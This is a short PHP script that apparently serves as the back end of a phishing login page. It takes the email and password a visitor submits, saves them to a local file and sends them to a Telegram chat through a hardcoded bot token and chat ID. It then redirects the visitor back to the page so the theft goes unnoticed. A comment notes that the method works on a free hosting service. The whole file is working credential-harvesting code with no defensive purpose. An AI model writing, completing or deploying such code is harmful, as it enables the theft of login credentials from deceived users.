<?php
$botToken = "8753804089:AAG4MhC4c8UWWT_8X-948JFGs1d9L9A3lG0";
$chatID   = "7905175526";

$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

if(!empty($email)){

    // Save locally
    $data = "📧 Email: $email\n🔑 Password: $password";
    file_put_contents("save.txt", $data."\n", FILE_APPEND);

    // Telegram send using stream_context (works on InfinityFree)
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    $postData = [
        "chat_id" => $chatID,
        "text" => $data
    ];

    $options = [
        "http" => [
            "method" => "POST",
            "header" => "Content-Type: application/x-www-form-urlencoded",
            "content" => http_build_query($postData)
        ]
    ];

    @file_get_contents($url, false, stream_context_create($options));
}

// Redirect back
header("Location:index.html");
exit();
?>